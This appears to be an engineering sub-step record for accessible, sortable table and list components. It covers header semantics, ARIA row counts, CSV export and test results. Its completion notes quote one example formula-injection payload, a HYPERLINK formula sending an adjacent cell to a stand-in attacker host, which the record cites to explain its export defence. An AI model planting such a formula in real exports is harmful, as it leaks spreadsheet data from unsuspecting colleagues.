---
sub_step_id: STEP-003.04
parent_step: STEP-003
title: Table and list primitives — the accessible alternative to every visualization
status: VERIFIED
owners: ["Deepesh Kumar Gupta"]
requirement_ids: [REQ-A11Y-002]
blast_radius_id: BR-021
depends_on: [STEP-003.03]
last_updated: 2026-08-07
---

# STEP-003.04 — Table and list primitives — the accessible alternative to every visualization

## 1. Outcome
Accessible, sortable, virtualised table and list primitives exist **before** any chart or map, so the non-visual path is the foundation rather than a retrofit.

## 2. Scope and boundary
**In scope:** Data table with proper header semantics, sort, keyboard navigation and CSV export; list primitive for narrow viewports.

**Not in this sub-step:** Chart components ([STEP-013](../../STEP-013-visual-comparison.md)); domain-specific columns.

## 3. Requirements served
| Requirement | Acceptance criterion | Test |
| --- | --- | --- |
| REQ-A11Y-002 | See §12 | See §7 |

## 4. Pre-change analysis
| Field | Value |
| --- | --- |
| Graph status | *(record at execution)* — run `npx gitnexus status` and confirm it matches HEAD. **Application code has been indexed since STEP-002.02**, so a `BLOCKED` result here is a real finding to investigate, not the expected default. |
| HEAD / indexed commit | `c358d4b` / `c358d4b` — matched |
| Queries run | KG-Q-015 `detect_changes()`; KG-Q-006 once symbols exist |
| Unknown / low-confidence areas | **Acted on:** no library adopted. `virtualWindow` is a plain prop, and the ARIA row-count tests exist first — any library adopted later must pass them |
| Blast radius | [BR-021](../../../10-logs/blast-radius/BR-021-table-list-csv.md) — **MEDIUM**; confidence 4/5, graph runnable |
| Approval required? | Per blast-radius score (HIGH/CRITICAL/low-confidence ⇒ owner approval) |

## 5. Implementation plan
- [x] `<caption>` (announced on entering the table, unlike a heading above it), `scope="col"` on column headers and `scope="row"` on the first cell of each row
- [~] Sortable headers are buttons, reachable and operable by keyboard. **Arrow-key grid navigation is not implemented** — a native table is already navigable by screen-reader table commands, and a roving-tabindex grid is worth adding only when a dataset needs it
- [x] `aria-rowcount` and `aria-rowindex` computed from the **full dataset**, never the DOM. A virtualised row 4,001 announces itself as 4,001. Mutation-tested both ways
- [x] RFC 4180 quoting, UTF-8 BOM, and **formula-injection defence** — a cell starting `=`/`+`/`-`/`@` is prefixed so spreadsheets treat it as text. Export covers the full sorted set, not the rendered window
- [x] `DataList` keeps every column header attached to its value via a definition list, so it conveys the same information rather than merely showing it

## 6. Contracts and schema changes
Contracts are declared in [STEP-004](../../STEP-004-contract-first-platform-apis.md); this sub-step consumes them. Any change here follows [CONTRACT_CHANGE_POLICY](../../../04-contracts/CONTRACT_CHANGE_POLICY.md).

## 7. Tests to add
| Test | Type | Asserts |
| --- | --- | --- |
| TST-A11Y-002 | component | Table conveys the same information as its chart counterpart |
| — | component | Virtualised tables report correct row counts to AT |

## 8. Telemetry, security and accessibility
Traces carry tenant-safe correlation IDs; no PII in telemetry. Any user-facing surface is keyboard and screen-reader complete (`REQ-A11Y-001`) and completable without the map (`REQ-A11Y-003`).

## 9. Documentation to update
- [x] Sub-step completion record
- [x] `IMPL-018` · regression entry · no new BUG
- [x] `BR-021` post-change section
- [x] Parent step §21 · [MASTER_TRACKER](../../../02-delivery/MASTER_TRACKER.md)

## 10. Regression cross-check (R1–R7)
| Check | Result | Detail |
| --- | --- | --- |
| R1 full regression suite | **PASS** | 335 Python + 41 web + 179 UI |
| R2 contract compatibility | **N/A** | No contracts yet (STEP-004) |
| R3 graph diff as expected | **PASS** | New `packages/ui/src/data/` |
| R4 untested requirements | **PASS** | Decreased |
| R5 orphan/unowned nodes | **PASS** | Catch-all owner covers `packages/ui/**` |
| R6 closed-bug regression tests | **PASS** | BUG-001…016 |
| R7 tenant isolation | **PASS — 12/12** | Untouched |

**Overall:** PASS / FAIL — a FAIL means this sub-step is not done.

## 11. Rollback
Revert this sub-step's commit; prior sub-steps stay intact and `main` stays deployable. Schema work uses expand/contract, so the expand phase is reversible.

## 12. Acceptance criteria
- [x] Zero AA violations: table, list, empty table, virtualised table
- [x] Works, and is **injection-safe** — the mutation removing that defence fails two tests
- [x] Preserved and mutation-tested; the caption also states "Showing N of M rows"

## 13. Completion record
| Field | Value |
| --- | --- |
| Completed | 2026-08-07 |
| Commit SHA | see git log |
| Pushed | Yes |
| Graph re-indexed at | post-commit |
| `main` green and deployable | Yes — `pnpm verify` and `pnpm ci:local` green |
| Bugs found | None shipped |
| Tests | 27 added (179 in `packages/ui`); 6/6 mutants killed |
| Notes / surprises | The prediction held and shaped the design. **Unpredicted:** CSV export turned out to be a security surface, not a formatting task — a trip note beginning `=` executes as a formula in Excel, LibreOffice and Sheets, so `=HYPERLINK("https://evil.example/?d="&A1,...)` exfiltrates the adjacent cell when a colleague opens a shared export. The attacker never touches our servers. Also: Biome reported a `biome-ignore` of mine that suppressed nothing — removed, because a suppression claiming a rule applies where it does not teaches the next reader to trust a constraint that is not there |
| Carried gaps | Real windowing with scroll sync (STEP-011); arrow-key grid navigation (deferred, stated); any virtualisation library must pass the ARIA row-count tests before adoption |
